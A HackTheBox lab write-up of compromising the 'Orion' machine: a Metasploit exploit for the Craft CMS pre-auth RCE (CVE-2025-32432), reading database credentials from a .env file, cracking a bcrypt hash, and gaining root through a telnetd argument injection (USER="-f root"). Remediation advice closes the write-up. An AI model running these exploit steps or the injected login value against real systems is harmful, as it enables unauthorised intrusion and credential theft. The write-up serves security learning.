# Orion

> **Disclaimer:** This writeup documents an authorized HackTheBox lab. Techniques and commands are provided for defensive learning and must only be used against systems you own or are explicitly authorized to test.

This HackTheBox lab demonstrates a complete Linux compromise beginning with an unauthenticated remote code execution vulnerability in Craft CMS 5.6.16. The application shell exposed database credentials and a crackable administrator password hash, which enabled SSH access as `adam`. A loopback-only GNU Inetutils `telnetd` service was then abused through CVE-2026-24061 to obtain a root shell.

## Lab Summary

| Item | Detail |
| --- | --- |
| Platform | HackTheBox |
| Machine | Orion |
| Target | `10.129.244.146` / `orion.htb` |
| Operating System | Ubuntu Linux; exact release not established |
| Initial Vector | Craft CMS 5.6.16 pre-authentication RCE (`CVE-2025-32432`) |
| Initial Access | Meterpreter and shell access as `www-data` |
| User Access | Craft database hash cracking and SSH login as `adam` |
| Privilege Escalation | GNU Inetutils `telnetd` authentication bypass (`CVE-2026-24061`) |
| Evidence Source | `pentest_trace` JSON export |
| Testing Date | 2026-09-28 |

## Evidence Notes

Passwords, password hashes, application secrets, and proof flags are redacted from this public writeup. The trace recorded the Craft CMS version and successful Metasploit exploitation, but did not retain the exact page or response used to fingerprint the version. It also did not retain the SSH command or an explicit SSH session transcript; SSH access is therefore described only to the extent supported by the recorded result.

## Reconnaissance

I ran RustScan with Nmap default scripts and service detection:

```bash
target=10.129.244.146
rustscan --ulimit 5000 -a $target -- -sC -sV
```

The scan identified two externally reachable TCP services:

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15
80/tcp open  http    nginx 1.18.0 (Ubuntu)
```

Requests sent to the IP address were redirected to `http://orion.htb/`. I added the hostname to `/etc/hosts`:

```bash
sudo nano /etc/hosts
```

```text
10.129.244.146 orion.htb
```

## Web Enumeration

I enumerated common paths with Gobuster:

```bash
gobuster dir -u http://orion.htb/ \
  -w /usr/share/wordlists/dirb/common.txt -t 64
```

Relevant results included:

```text
/admin       302 -> http://orion.htb/admin/login
/assets      301 -> http://orion.htb/assets/
/index.html  200
/index       200
/index.php   200
/logout      302 -> http://orion.htb/
/wp-admin    418
```

Application fingerprinting identified Craft CMS 5.6.16. This version is affected by [CVE-2025-32432](https://github.com/craftcms/cms/security/advisories/GHSA-f3gw-9ww9-jmc3), a critical remote code execution vulnerability fixed in Craft CMS 5.6.17.

## Initial Access

I used the Metasploit module for the Craft CMS pre-authentication RCE:

```text
msfconsole
use exploit/linux/http/craftcms_preauth_rce_cve_2025_32432
set RHOSTS orion.htb
set LHOST 10.10.14.186
exploit
```

The exploit returned a Meterpreter session. `getuid` confirmed that the application was running as `www-data`:

```text
meterpreter > getuid
Server username: www-data
```

I opened a system shell and upgraded it with `script`:

```text
meterpreter > shell
script /dev/null -c /bin/bash
```

```text
www-data@orion:~/html/craft/web$
```

## Craft Configuration Disclosure

From the Craft application directory, I inspected the environment configuration:

```bash
cd ~/html/craft
cat .env
```

The file exposed a local MariaDB configuration, including the `root` database username and plaintext password:

```text
CRAFT_DB_SERVER=127.0.0.1
CRAFT_DB_PORT=3306
CRAFT_DB_DATABASE=orion
CRAFT_DB_USER=root
CRAFT_DB_PASSWORD=<REDACTED>
```

These credentials allowed access to the `orion` database:

```bash
mysql -u root -p orion
```

## Administrator Credential Recovery

I enumerated the database and queried the Craft users table:

```sql
SHOW TABLES;
SELECT * FROM users;
```

The query returned an administrator account named `adam` and a bcrypt password hash:

```text
username: admin
email: adam@orion.htb
password: <REDACTED-BCRYPT-HASH>
```

I saved the hash locally, confirmed its format, and tested it against the RockYou wordlist:

```bash
hashid hash
john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash
```

John recovered the password. The recovered value is intentionally omitted from this public writeup.

## User Access

The recovered credential was accepted for the operating-system account `adam` over SSH. User-level access was confirmed by reading the proof file:

```bash
cat ~/user.txt
```

```text
<REDACTED>
```

## Local Service Enumeration

I enumerated listening services from the `adam` session:

```bash
netstat -tulnp
```

In addition to SSH, HTTP, DNS, and MariaDB, the host exposed Telnet only on the loopback interface:

```text
127.0.0.1:23 LISTEN
```

Version enumeration identified GNU Inetutils 2.7:

```bash
telnet --version
```

```text
telnet (GNU inetutils) 2.7
```

GNU Inetutils `telnetd` through version 2.7 is affected by [CVE-2026-24061](https://nvd.nist.gov/vuln/detail/CVE-2026-24061), which accepts a malicious `USER` environment value that injects the `-f root` option into the login process.

## Privilege Escalation

Because the vulnerable Telnet service was reachable locally, I set the crafted `USER` value and connected to the loopback listener:

```bash
USER="-f root" telnet -a 127.0.0.1
```

The service returned a root shell without requesting the root password:

```text
root@orion:~#
```

Root access was confirmed by reading the proof file:

```bash
cat /root/root.txt
```

```text
<REDACTED>
```

## Attack Path

```text
RustScan and Nmap
        |
        v
Craft CMS 5.6.16 identified on port 80
        |
        v
CVE-2025-32432 exploited without authentication
        |
        v
Shell obtained as www-data
        |
        v
Craft .env exposes MariaDB root credentials
        |
        v
Database reveals adam's bcrypt password hash
        |
        v
Weak password cracked and reused for SSH
        |
        v
Loopback GNU Inetutils telnetd 2.7 discovered
        |
        v
CVE-2026-24061 authentication bypass
        |
        v
Root shell obtained
```

## Root Cause

The full compromise resulted from multiple weaknesses that amplified one another:

- Craft CMS 5.6.16 was exposed with a critical unauthenticated RCE vulnerability.
- The compromised web-service account could read an environment file containing a privileged database password.
- The application database stored an administrator hash protected by a weak, wordlist-crackable password.
- The recovered password was reusable for an operating-system SSH account.
- A vulnerable GNU Inetutils `telnetd` service ran locally and allowed authentication bypass as root.

## Remediation

- Upgrade Craft CMS to 5.6.17 or later and follow the vendor's supported security-update path.
- Rotate the Craft security key, database password, administrator password, and any credential reused by `adam`.
- Run Craft with a dedicated least-privileged database account instead of MariaDB `root`.
- Store secrets outside the web application tree and restrict configuration-file permissions to the service identity that requires them.
- Enforce long, unique passwords and prevent reuse between application and operating-system accounts.
- Upgrade GNU Inetutils to a release containing the CVE-2026-24061 fix, or remove and disable `telnetd` entirely.
- Prefer SSH with public-key authentication for administrative access.
- Review web, Craft, authentication, and process-execution logs for signs of exploitation.

## Key Takeaways

- A single vulnerable web component can expose every secret available to its service account.
- Database credentials should be minimally privileged even when the database listens only on loopback.
- Password hashing does not compensate for weak passwords or credential reuse.
- Loopback-only services remain exploitable after an attacker gains any local foothold.
- Patch management must include internal and locally bound services, not only internet-facing applications.

## References

- [Craft CMS security advisory: CVE-2025-32432](https://github.com/craftcms/cms/security/advisories/GHSA-f3gw-9ww9-jmc3)
- [NVD: CVE-2025-32432](https://nvd.nist.gov/vuln/detail/CVE-2025-32432)
- [NVD: CVE-2026-24061](https://nvd.nist.gov/vuln/detail/CVE-2026-24061)
